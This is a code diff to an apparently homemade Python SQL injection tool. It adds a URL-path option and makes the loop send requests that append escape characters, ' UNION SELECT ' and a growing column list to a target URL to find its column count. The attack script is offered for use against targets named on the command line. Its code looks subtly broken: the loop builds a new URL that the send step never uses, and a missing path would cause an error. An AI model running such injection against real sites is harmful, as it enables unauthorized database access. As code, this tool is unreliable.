@@ -8,16 +8,19 @@ import gzip
 class HTTPrequest():
     """ Sends HTTP request and retrieves response. """
 
-    def __init__(self, url, header, data=None):
+    def __init__(self, url, header, path=None, data=None):
         self.url = url
+        self.path = urllib.request.pathname2url(path)
+        print(self.path)
+        self.url = self.url + self.path
         self.header = self._format_header(header)
         self.data = data
-        self.request = urllib.request.Request(self.url, self.data, self.header)
         self.response = None
 
 
     def send_request(self):
         """ Send HTTP request and decompress response if gzip compressed. """
+        self.request = urllib.request.Request(self.url, self.data, self.header)
         with urllib.request.urlopen(self.request) as response:
             self.response = response.read()
             # Check if gzip compressed.
@@ -44,8 +47,8 @@ class HTTPrequest():
 
 class Iterator(HTTPrequest):
 
-    def __init__(self, url, header, data=None, first_escape="", query="", last_escape=""):
-        super().__init__(url, header, data)
+    def __init__(self, url, header, path=None, data=None, first_escape="", query="", last_escape=""):
+        super().__init__(url, header, path, data)
         self.query = query
         self.first_escape = first_escape
         self.last_escape = last_escape
@@ -55,8 +58,8 @@ class Iterator(HTTPrequest):
         self.column = ""
         for i in range(1, 20):
             self.column += str(i) + self.delim
-            self.new_url = self.url + self.first_escape + self.query + self.column + self.last_escape
-            print('New url: ' + self.new_url)
+            self.new_url = self.url + urllib.request.pathname2url(self.first_escape + self.query + self.column + self.last_escape)
+            self.send_request()
 
 
 ###### Injection base class ######
@@ -88,11 +91,12 @@ parser.add_argument("url", help="url of target in format http://x.x.x.x:port/pat
 parser.add_argument("-H", "--header", help="Header values in comma seperated list. See README for formatting. ex. Host: x.x.x.x, Accept: text/html")
 parser.add_argument("-fE", "--firstesc", help="First escape character used in query. ex. -fE '")
 parser.add_argument("-lE", "--lastesc", help="Last escape character used in query, usually a comment. ex. -- -")
+parser.add_argument("-p", "--path", help="url path if any. ex. -p /path/to/file.ex")
 
 ###### Main function ######
 def main():
     args = parser.parse_args()
-    it = Iterator(args.url, args.header, first_escape=args.firstesc, query=" UNION SELECT ", last_escape=args.lastesc)
+    it = Iterator(args.url, args.header, path=args.path, first_escape=args.firstesc, query=" UNION SELECT ", last_escape=args.lastesc)
     it.iterate_columns()
 if __name__ == "__main__":
     main()
